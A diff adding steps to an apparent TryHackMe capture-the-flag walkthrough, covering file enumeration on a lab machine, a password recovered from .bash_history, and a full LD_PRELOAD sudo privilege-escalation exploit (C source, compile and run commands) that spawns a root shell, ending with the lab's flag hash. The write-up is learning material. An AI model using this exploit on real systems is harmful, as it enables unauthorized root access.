@@ -113,3 +113,136 @@ httpd = HTTPServer(('localhost', 1337), SimpleHTTPRequestHandler)
 httpd.serve_forever()
 ```
 
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/c6c92c66-f415-4eed-adc2-15e622d12814)
+
+```
+cat wsgi.py 
+```
+
+```
+from flaskapp import app
+if __name__ == "__main__":
+    app.run()
+```
+
+```
+cat index.html
+```
+
+```
+<!DOCTYPE html>
+<html>
+<head>
+  <title>URL Tester</title>
+  <link rel="stylesheet" type="text/css" href="css/style.css">
+</head>
+<body>
+  <div class="container">
+    <h1>Beta URL Tester</h1>
+    <p>This page provides the functionality that allows you to test a URL to see if it is alive. Enter a URL in the form below and click "Submit" to test it.</p>
+    <form action="/" method="POST">
+      <label for="url">Enter URL:</label>
+      <input type="text" id="url" name="url" placeholder="http://example.com">
+      <input type="submit" value="Submit">
+    </form>
+  </div>
+</body>
+</html>
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/302d3c51-7f2a-4836-aa94-ead5d60fe3cd)
+
+```
+cat .bash_history
+```
+
+```
+whoami
+pwd
+ls -al
+ls
+cd ..
+sudo -l
+echo "saad:MyStrongestPasswordYet$4291" > creds.txt
+rm creds.txt
+sudo -l
+whomai
+whoami
+pwd
+ls -al
+sudo -l
+ls -al
+pwd
+whoami
+mysql -u root -p
+netstat -antlp
+mysql -u root
+sudo su
+ssh root@192.169.155.104
+mysql -u user -p
+mysql -u db_user -p
+ls -ld /var/lib/mysql
+ls -al
+cat .bash_history 
+cat .bash_logout 
+nano .bashrc 
+ls -al
+```
+
+*saad:MyStrongestPasswordYet$4291*
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/d62f5e3d-363b-4b6c-a28b-58b6dbae40f0)
+
+```
+sudo -l
+```
+
+```
+[sudo] password for saad: 
+Matching Defaults entries for saad on m4lware:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
+
+User saad may run the following commands on m4lware:
+    (root) /usr/bin/ping
+```
+
+https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld_preload-and-ld_library_path
+
+```
+nano /tmp/pe.c
+```
+
+```
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+```
+
+```
+gcc -fPIC -shared -o pe.so pe.c -nostartfiles
+```
+
+```
+sudo LD_PRELOAD=./pe.so /usr/bin/ping
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/2645157e-3459-4843-9478-82f7f750457d)
+
+```
+Walkthrough from
+https://youtu.be/UgAhrTVbd70?t=2982
+https://www.youtube.com/@TCMSecurityAcademy
+```
+
+```
+992bfd94b90da48634aed182aae7b99f
+```
+
+![image](https://github.com/r1skkam/TryHackMe-Walkthroughs/assets/58542375/9c54e06d-f1a2-4072-a519-968041bfab75)
